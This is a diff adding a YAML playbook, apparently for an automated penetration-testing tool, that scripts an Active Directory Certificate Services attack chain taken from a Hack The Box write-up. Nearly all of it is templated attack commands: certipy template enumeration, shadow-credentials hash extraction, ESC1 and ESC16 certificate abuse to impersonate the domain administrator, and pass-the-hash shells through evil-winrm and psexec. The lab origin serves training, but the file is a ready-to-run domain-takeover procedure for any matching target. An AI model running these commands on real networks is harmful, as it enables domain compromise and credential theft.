@@ -1,0 +1,68 @@
+name: ad-adcs-chain
+display_name: "AD Certificate Services (ADCS) Attack Chain"
+description: "Exploit Active Directory Certificate Services — from enumeration through ESC vulnerabilities to domain admin. Extracted from HTB Fluffy writeup."
+
+applicable_when:
+  ports: [88, 389, 445]
+  services: ["kerberos", "ldap", "smb"]
+
+steps:
+  - id: adcs-detect
+    name: "Detect ADCS Presence"
+    phase: recon
+    description: "Check if ADCS is installed on the domain using nxc ldap module"
+    commands:
+      - "nxc ldap {IP} -u {USER} -p '{PASSWORD}' -M adcs"
+      - "ldapsearch -x -H ldap://{IP} -b 'CN=Configuration,DC=DOMAIN,DC=LOCAL' '(objectClass=pKIEnrollmentService)' cn dNSHostName"
+    check:
+      credentials_min: 1
+
+  - id: adcs-enum-templates
+    name: "Enumerate Vulnerable Templates"
+    phase: recon
+    description: "Scan Certificate Authority for vulnerable templates (ESC1-ESC16)"
+    commands:
+      - "certipy-ad find -u {USER}@{DOMAIN} -p '{PASSWORD}' -dc-ip {IP} -vulnerable -enabled -stdout"
+      - "certipy-ad find -u {USER}@{DOMAIN} -p '{PASSWORD}' -dc-ip {IP} -vulnerable -enabled -json -output loot/certipy_results.json"
+
+  - id: shadow-credentials
+    name: "Shadow Credentials (GenericWrite)"
+    phase: credential-access
+    description: "If GenericWrite/GenericAll over a target — add shadow credentials to extract their RC4 hash"
+    commands:
+      - "certipy-ad shadow auto -username {USER}@{DOMAIN} -password '{PASSWORD}' -account TARGET_USER"
+      - "# Extracts RC4 hash without knowing target's password"
+      - "# Check BloodHound for GenericWrite/GenericAll edges first"
+
+  - id: esc1-exploit
+    name: "ESC1 — Requestor Supplies SAN"
+    phase: exploitation
+    description: "Template allows requester to specify Subject Alternative Name — request cert as administrator"
+    commands:
+      - "certipy-ad req -u {USER}@{DOMAIN} -p '{PASSWORD}' -ca CA_NAME -template TEMPLATE_NAME -upn administrator@{DOMAIN} -target {IP}"
+      - "certipy-ad auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}"
+
+  - id: esc16-exploit
+    name: "ESC16 — UPN Spoofing"
+    phase: exploitation
+    description: "Change target account UPN to administrator, request cert, revert UPN, authenticate"
+    commands:
+      - "# Step 1: Change UPN to administrator"
+      - "certipy-ad account update -username {USER}@{DOMAIN} -p '{PASSWORD}' -user TARGET -upn administrator"
+      - "# Step 2: Request certificate as target"
+      - "certipy-ad req -u TARGET -hashes HASH -dc-ip {IP} -target {HOSTNAME} -ca CA_NAME -template User"
+      - "# Step 3: Revert UPN (important!)"
+      - "certipy-ad account update -username {USER}@{DOMAIN} -p '{PASSWORD}' -user TARGET -upn TARGET@{DOMAIN}"
+      - "# Step 4: Authenticate with admin cert"
+      - "certipy-ad auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}"
+
+  - id: pth-admin
+    name: "Admin Access via Pass-the-Hash"
+    phase: post-exploitation
+    description: "Use extracted admin hash for shell access and flag capture"
+    commands:
+      - "evil-winrm -i {IP} -u Administrator -H ADMIN_HASH"
+      - "impacket-psexec {DOMAIN}/Administrator@{IP} -hashes :ADMIN_HASH"
+      - "type C:\\Users\\Administrator\\Desktop\\proof.txt"
+    check:
+      flags: true
